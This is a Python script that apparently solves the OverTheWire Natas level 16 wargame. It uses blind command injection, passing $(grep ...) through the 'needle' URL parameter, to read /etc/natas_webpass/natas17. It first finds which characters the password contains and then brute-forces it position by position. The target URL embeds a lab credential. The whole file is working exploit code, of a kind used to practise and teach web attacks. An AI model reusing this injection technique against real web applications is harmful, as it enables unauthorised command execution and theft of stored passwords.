# Library for Ascii characters and POST requests
import string, requests

# All possible characters
all_chars = '0123456789' + string.ascii_lowercase + string.ascii_uppercase

# Parsed characters, the characers that exist in the working password
parsed_chars = ''

# Working Password
password = ''

# The target URL
target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/'

# String that says whether we're good
exists = 'Output:\n<pre>\n</pre>'

# Verifying we can connect
req = requests.get(target)
if req.status_code != requests.codes.ok:
        raise ValueError('Poof! Unable to connect to target :(')
else:
        print 'Connected to target. Starting character parsing...'

# Verify which characters are part of the working password
for c in all_chars:
        # Command injection #1
        req = requests.get(target+'?needle=$(grep '+c+' /etc/natas_webpass/natas17)bypassed')
        # Verify if password uses character
        if req.content.find(exists) != -1:
                parsed_chars += c
                print 'Chars in pass: ' + parsed_chars

print 'Characters successfully parsed. Starting to brute force...'

# With the assumption passwords are 32 characters long
for i in range(32):
        for c in parsed_chars:
                # Command injection #2
                req = requests.get(target+'?needle=$(grep ^'+password+c+' /etc/natas_webpass/natas17)bypassed')
                # Figuring out characters at the correct position in the pass
                if req.content.find(exists) != -1:
                        password += c
                        print 'Password: ' + password + '*' * int(32 - len(password))
                        break

print 'Successfully brute-forced password.'

